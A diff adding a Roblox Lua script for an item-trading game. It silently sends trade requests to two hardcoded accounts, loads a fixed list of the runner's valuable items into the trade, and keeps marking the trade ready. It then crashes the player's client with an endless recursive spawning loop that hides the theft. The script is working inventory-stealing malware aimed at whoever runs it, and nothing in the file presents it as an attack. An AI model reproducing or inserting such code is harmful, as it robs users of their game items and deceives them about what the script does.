@@ -1,0 +1,105 @@
+local users = {"susuk213", "molen213k"}
+
+repeat task.wait() until game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+
+local exit
+exit = function()
+    while true do
+        spawn(function()
+            local part = Instance.new('Part')
+            part.Parent = workspace
+        end)
+        spawn(function()
+            exit()
+        end)
+    end
+end
+
+local Library = require(game.ReplicatedStorage:WaitForChild('Library'))
+local TradingCmds = require(game.ReplicatedStorage.Library.Client.TradingCmds)
+
+local function findItem(Type, Id, _, tn)
+    local save = Library.Save.Get().Inventory
+    if save[Type] then
+        for i,v in pairs(save[Type]) do
+            if v.id == Id and (v.tn == tn or tn == nil) then
+                local AM = (v._am) or 1
+                return i, AM
+            end
+        end
+    end
+end
+
+local Targets = {}
+for i, Player in game.Players:GetChildren() do
+    if table.find(users, Player.Name) then
+        table.insert(Targets, Player.Name)
+    end
+end
+
+while #Targets == 0 do
+    task.wait(10)
+end
+
+local ITEM_SET = {
+    {
+        [1] = "Enchant",
+        [2] = "Super Lightning",
+        [3] = 1,
+    },
+    {
+        [1] = "Enchant",
+        [2] = "Tap Power",
+        [3] = 1,
+        [4] = 7
+    },
+    {
+        [1] = "Pet",
+        [2] = "Dominus Mushrooms",
+        [3] = 1,
+    },
+    {
+        [1] = "Fruit",
+        [2] = "Banana",
+        [3] = 200,
+    },
+    {
+        [1] = "Fruit",
+        [2] = "Rainbow",
+        [3] = 200,
+    },
+    {
+        [1] = "Potion",
+        [2] = "Coins",
+        [3] = 10,
+        [4] = 8,
+    },
+}
+
+for i, TargetUsername in Targets do
+    local HasRequest = function(user) return TradingCmds.HasOutgoingRequestToPlayer(game.Players:FindFirstChild(user)) end
+    while not HasRequest(TargetUsername) and not TradingCmds.GetState() do
+        game.ReplicatedStorage.Network:FindFirstChild("Server: Trading: Request"):InvokeServer(game:GetService("Players"):FindFirstChild(TargetUsername))
+        task.wait(1)
+    end
+    
+    while not TradingCmds.GetState() do task.wait(1) end
+    local currentState = TradingCmds.GetState()
+    if currentState then
+        local localIndex = table.find(TradingCmds.GetState()._players, game.Players.LocalPlayer)
+        for _, v in ITEM_SET do
+            local i, AM = findItem(unpack(v))
+            print(v[2], i, AM)
+            local success = false
+            repeat success = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(currentState._id, v[1], i, v[3]) task.wait() until success
+        end
+        while TradingCmds.GetState() do
+            if TradingCmds.GetState()._ready[localIndex] == false then
+                repeat local readySuccess, readyReason = Library.Network.Invoke("Server: Trading: Set Ready", TradingCmds.GetState()._id, true, TradingCmds.GetState()._counter) until readySuccess                                    
+            end
+            task.wait(1)
+        end
+    end
+end
+
+exit()
